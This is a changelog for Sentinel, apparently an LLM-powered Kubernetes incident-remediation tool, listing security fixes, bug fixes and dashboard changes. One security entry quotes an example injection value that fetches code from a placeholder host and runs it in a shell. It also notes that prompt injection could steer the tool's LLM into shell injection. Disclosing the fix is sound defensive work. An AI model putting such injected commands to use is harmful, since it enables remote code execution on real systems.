# Changelog

All notable changes to Sentinel are documented here. The format follows [Keep a Changelog](https://keepachangelog.com/). Versions are sourced from the `VERSION` file (single source of truth).

## [5.9.5] — 2026-07-04

### Security (Critical)
- **C1+C3**: Removed `set -x` from Kaniko init script — GitHub PAT was leaked to pod logs via bash trace output. Changed `set -ex` → `set -e`, replaced `echo` with `printf`, added `chmod 600 ~/.git-credentials`.
- **C2**: Added `validateTestFilePath()` + `validateTestCommand()` to test runner — LLM-generated test/reproducer file paths and commands are now validated before shell interpolation. Prevents prompt-injection-driven shell injection (`TestFile="$(curl evil|sh)"`).

### Bug Fixes (High)
- **H1**: `SENTINEL_AUTO_MERGE_COOLDOWN_MIN` env var is now respected — was silently ignored (cooldown always 1h). Added `defaultDur` field to `Cooldown` struct.
- **H2**: Pipeline iteration counter no longer double-incremented — effective max iterations was `MaxIterations/2`. Removed duplicate `state.Iterations++` in `investigator.go`.
- **H3**: pprof routes now dispatch correctly — `go tool pprof .../debug/pprof/heap` returns a heap profile instead of HTML index.
- **H4**: `recordOutcome` now goes through mutex-protected `Store.UpdateVectorOutcome()` — concurrency invariant restored.
- **H5**: Auto-detected incidents no longer attempt to patch non-existent CR "auto-detected" — spurious 404 error logs eliminated. Added `isRealCR()` helper.
- **H6**: Fixed operator-precedence bug in `ParseWholeFileReplacement` — potential panic on edge case.

### Helm Chart
- Fixed ServiceMonitor + PDB selector mismatch — metrics scraping + PDB now work for any release name (was broken unless release named exactly "sentinel").

### Frontend
- Added `ErrorBoundary` component wrapping all 12 dashboard sections — render crash in one section no longer white-screens the entire app.
- Fixed auto-merge section hardcoded KPIs (Total Merged, Total Reverted, Success Rate) — now derived from incidents.
- Fixed dashboard hardcoded values (successRate, queueDepth, mergedCount, revertedCount).
- Deleted 8 dead files (~1,100 lines): Chart.tsx, ActivityFeed.tsx, ConfidenceBar.tsx (dup), StatusBadge.tsx (dup), Sidebar.tsx (legacy), ui-helpers.tsx, use-fetch.ts, use-sse.ts.
- Deleted 4 unused shadcn components: tabs, separator, scroll-area, slider.

## [5.9.4] — 2026-07-03

### Frontend (SSE + Live Updates)
- Fixed SSE protocol mismatch — backend was sending named events (`event: <type>`), frontend only listened on `onmessage`. All SSE events now reach the UI.
- Added `es.onopen` handler — "live" indicator flips immediately on connect.
- Fixed live-investigation pipeline phases — `tracePhases()` now maps by `entry.agent` (real backend schema) instead of `entry.phase` (which never existed).
- Fixed resolved incident stuck spinner — `Loader2` gated on `isInvestigating()`. Resolved shows `CheckCircle2`, failed shows `XCircle`.
- Fixed mangled code diff — now uses `<pre whitespace-pre-wrap font-mono>` with per-line `+`/`-` prefix.
- Converted incident drawer to full-screen view (`w-screen sm:max-w-none`).
- Fixed PRs tab showing 0 PRs — added `enrichIncidentPRFields()` to mirror `pr_number`/`pr_url` from `state.execution_result` to top-level incident JSON.
- Fixed auto-merge queue — `recentOutcomes` derived from incidents with PR (was hardcoded `[]`).
- Improved sandbox view — uses real `sandbox_summary` + `sandbox_verified` from backend.
- Fixed dashboard "streaming" pill — gates on `sseConnected` (was hardcoded "streaming").

## [5.9.3] — 2026-07-03

### Infrastructure
- Added retry logic to `npm ci` in Dockerfile (3 attempts with 10s backoff) — fixes transient ECONNRESET during release builds.

## [5.9.2] — 2026-07-02

### Frontend
- Aligned frontend types with actual Go API responses — fixed dashboard crash on `rate_limit` being undefined from auto-merge endpoint.

## [5.9.1] — 2026-07-02

### Infrastructure
- Made web UI + static assets public (login gate was blocked by auth on static files).

## [5.9.0] — 2026-07-02

### Features
- Comprehensive React dashboard with 12 sections (Dashboard, Incidents, Live Investigation, Sandbox, Pull Requests, Providers, Auto-Merge, Detection, Chatops, Metrics, Settings, API Explorer).
- SSE real-time event streaming.
- Command palette (Cmd+K).

## [5.8.0] — 2026-07-02

### Features
- v4.0.0 chatops foundation: 19 `/sentinel` commands across 3 permission tiers.
- Multi-provider LLM failover pool with circuit breaker.
- 11-gate auto-merge policy with rate limiting + cooldown.
